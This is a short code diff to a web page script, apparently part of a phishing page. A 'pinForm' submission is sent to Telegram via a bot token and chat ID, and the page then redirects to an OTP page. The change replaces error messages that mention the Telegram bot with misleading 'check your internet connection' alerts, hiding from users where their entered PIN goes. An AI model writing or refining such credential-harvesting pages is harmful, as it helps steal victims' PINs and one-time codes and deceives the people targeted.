@@ -322,11 +322,11 @@ document.getElementById('pinForm').addEventListener('submit', async function(e) 
       // Redirect on success
       window.location.href = 'trialotp.html';
     } else {
-      alert('Failed to submit. This may be due to CORS or invalid bot credentials — check the console for details.');
+      alert('Error. Check your internet connnection for details.');
     }
   } catch (error) {
-    console.error('Error sending to Telegram:', error);
-    alert('Submission failed. Please check console for details and ensure your bot token/chat ID are correct.');
+    console.error('Error:', error);
+    alert('Error. Please check Your Internet Connection');
   }
 });
 </script>
